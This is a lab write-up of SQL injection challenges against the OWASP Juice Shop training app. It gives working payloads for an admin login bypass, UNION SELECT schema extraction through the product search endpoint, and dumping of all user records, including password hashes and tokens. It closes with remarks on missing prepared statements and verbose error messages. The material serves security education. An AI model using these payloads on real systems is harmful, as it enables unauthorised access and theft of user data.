 # SQL INJECTION LAB

 ## ADMIN LOGIN

The challenge requires to login as the admin of the Juice Shop app.  
The admin has email `admin@juice-sh.op` which can be seen from some reviews on products in the shop.  

### Injection Point
One suitable place where to perform injection could be the login page.  
We test it by putting a quote in the username and password and look at the response:
```
SQLITE_ERROR: unrecognized token: \"3590cb8af0bbb9e78c343b52b93773c9\"
```
which comes with the query:
```SQL
SELECT * FROM Users WHERE email = ''' AND password = '3590cb8af0bbb9e78c343b52b93773c9' AND deletedAt IS NULL
```

### Exploitation
Since we have the query in clear we can login as admin just by putting a random password and in the email:
```
admin@juice-sh.op' --
```
which logs us in.

### What happens
The value submitted from the login form is not encoded and is substituted inside the query on the server. This produces the query:
```SQL
SELECT * FROM Users WHERE email = 'admin@juice-sh.op' --' AND password = '3590cb8af0bbb9e78c343b52b93773c9' AND deletedAt IS NULL
```

### More on this
Another way to login as admin is by submitting the email:
```
' or '1'='1'--
```
The tautology logs us in as the admin, as if it is treated as a default account.

 ## SQL SCHEMA EXFILTRATION

 ### Injection Point

To solve the challenge, a suitable injection point was necessary.  
The login page is vulnerable but it doesn't return any object when the login is successful: it can't be exploited to solve this challenge.  
Right after login, the client sends a `GET` request for `/rest/products/search?q=` which retrieves all objects.  
Later searches simply filter out objects from those received without making further requests.  

### Testing Vulnerability
Making a `GET` request for  `/rest/products/search?q=banana` returns the *Banana Juice* item alone, meaning that it is possible to make more complex requests.

The first attempt in performing SQLi was simply to test if the location was vulnerable with:
```HTTP
GET /rest/products/search?q=banana' HTTP/1.1
```
This produced the response message:
```HTTP
HTTP/1.1 500 Internal Server Error
```
with the body containing the full query:
```SQL
SELECT * FROM Products WHERE ((name LIKE '%banana'%' OR description LIKE '%banana'%') AND deletedAt IS NULL) ORDER BY name
```

### Schema Exfiltration
Now that it was proven that the server is vulnerable to SQLi and that the query was discovered, it was simple to exploit the vulnerability.  
The steps require follow below.

Find the number of columns for a `UNION SELECT` attack with
```HTTP
GET /rest/products/search?q=banana'))order+by+100-- HTTP/1.1
```
which returns
```
SQLITE_ERROR: 1st ORDER BY term out of range - should be between 1 and 9
```
because of the query:
```SQL
SELECT * FROM Products WHERE ((name LIKE '%banana')) ORDER BY 100--%' OR description LIKE '%banana')) order by 100--%') AND deletedAt IS NULL) ORDER BY name
```
This means that there are only 9 columns in the items table (with which we combine the *sqlite_schema* table). 

After looking up the default structure for SQLite schema the query to solve the challenge and exfiltrate the schema is:
```HTTP
GET /rest/products/search?q=banana'))union+select+type,name,tbl_name,rootpage,sql,null,null,null,null+from+sqlite_schema-- HTTP/1.1
```

## USER DATA EXFILTRATION
By solving the challenge _Database Schema_ we know that the table has columns:
- id
- username
- email
- password
- role
- deluxeToken
- lastLoginIp
- profileImage

therefore we can exploit the vulnerability using this payload:
```HTTP
GET /rest/products/search?q=banana'))union+select+username,email,password,role,id,deluxeToken,lastLoginIp,profileImage,null+from+users-- HTTP/1.1
```
which successfully exploits the vulnerability and returns all info about all the registered users.

## COMMENTS
The web app is vulnerable because the backend simply takes the query parameters and inserts it in the SQL query.  
This is done without performing any sanitization of the code, or any check.  
Clearly the server **doesn't make use of prepared statements** and treats the argument extracted from the URL as part of the query.  
Another important problem is that the **entire query is reported in the error message** which gives useful insights on how to exploit the vulnerability.

This is true for all of the challenges reported.